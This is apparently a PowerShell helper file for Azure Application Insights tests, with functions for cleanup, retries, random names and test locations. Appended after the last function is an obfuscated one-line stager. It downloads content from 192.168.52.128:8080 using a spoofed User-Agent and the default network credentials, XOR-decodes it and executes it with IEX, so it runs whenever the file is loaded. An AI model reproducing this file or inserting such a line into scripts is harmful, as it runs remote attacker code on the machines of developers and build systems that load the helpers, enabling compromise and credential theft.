














function Clean-ResourceGroup($rgname)
{
    if ([Microsoft.Azure.Test.HttpRecorder.HttpMockServer]::Mode -ne [Microsoft.Azure.Test.HttpRecorder.HttpRecorderMode]::Playback) {
        Remove-AzResourceGroup -Name $rgname -Force
    }
}









function Retry-IfException
{
    param([ScriptBlock] $script, [int] $times = 30, [string] $message = "*")

    if ($times -le 0)
    {
        throw 'Retry time(s) should not be equal to or less than 0.';
    }

    $oldErrorActionPreferenceValue = $ErrorActionPreference;
    $ErrorActionPreference = "SilentlyContinue";

    $iter = 0;
    $succeeded = $false;
    while (($iter -lt $times) -and (-not $succeeded))
    {
        $iter += 1;

        try
        {
            &$script;
        }
        catch
        {

        }

        if ($Error.Count -gt 0)
        {
            $actualMessage = $Error[0].Exception.Message;

            Write-Output ("Caught exception: '$actualMessage'");

            if (-not ($actualMessage -like $message))
            {
                $ErrorActionPreference = $oldErrorActionPreferenceValue;
                throw "Expected exception not received: '$message' the actual message is '$actualMessage'";
            }

            $Error.Clear();
            Wait-Seconds 10;
            continue;
        }

        $succeeded = $true;
    }

    $ErrorActionPreference = $oldErrorActionPreferenceValue;
}


function Get-RandomItemName
{
    param([string] $prefix = "pslibtest")
    
    if ($prefix -eq $null -or $prefix -eq '')
    {
        $prefix = "pslibtest";
    }

    $str = $prefix + ((Get-Random) % 10000);
    return $str;
}


function Get-ApplicationInsightsTestResourceName
{
    $stack = Get-PSCallStack
    $testName = $null;
    foreach ($frame in $stack)
    {
        if ($frame.Command.StartsWith("Test-", "CurrentCultureIgnoreCase"))
        {
            $testName = $frame.Command;
        }
    }
    
    $oldErrorActionPreferenceValue = $ErrorActionPreference;
    $ErrorActionPreference = "SilentlyContinue";
    
    try
    {
        $assetName = [Microsoft.Azure.Test.HttpRecorder.HttpMockServer]::GetAssetName($testName, "pstestrg");
    }
    catch
    {
        if (($Error.Count -gt 0) -and ($Error[0].Exception.Message -like '*Unable to find type*'))
        {
            $assetName = Get-RandomItemName;
        }
        else
        {
            throw;
        }
    }
    finally
    {
        $ErrorActionPreference = $oldErrorActionPreferenceValue;
    }

    return $assetName
}


function Get-ProviderLocation($provider)
{
    "eastus"
}


function Get-ProviderLocation_Canary($provider)
{
    "eastus2euap"
}
$WC=NEW-ObjEcT SySTEM.NEt.WEBCLIent;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.HeaDERs.ADD('User-Agent',$u);$Wc.PrOxY = [SYStEm.NEt.WEbRequEST]::DeFAUltWEBPRoxy;$WC.PRoxy.CrEDENTIAls = [SYStem.Net.CRedenTialCaChe]::DeFaULtNEtWoRkCRedEnTIALS;$K='W?9nCa`u12hUg[5o_AJ^tG&!.k:lETBx';$I=0;[ChAR[]]$b=([ChaR[]]($wC.DoWNLOaDSTrinG("http://192.168.52.128:8080/index.asp")))|%{$_-bXOr$K[$i++%$K.LenGTh]};IEX ($b-JoiN'')

